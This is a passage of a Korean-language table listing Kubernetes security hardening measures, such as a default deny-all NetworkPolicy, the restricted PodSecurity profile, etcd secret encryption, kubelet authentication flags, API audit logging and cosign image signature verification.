| NetworkPolicy 적용 | 모든 네임스페이스에 기본 deny-all 정책 |
| PodSecurity Admission | `restricted` 프로파일 강제 |
| etcd 암호화 | EncryptionConfiguration으로 시크릿 암호화 |
| kubelet 인증 강화 | `--anonymous-auth=false`, `--authorization-mode=Webhook` |
| API 서버 감사 로그 | `--audit-log-path`, `--audit-policy-file` 설정 |
| 이미지 서명 검증 | Sigstore/cosign + OPA Gatekeeper |
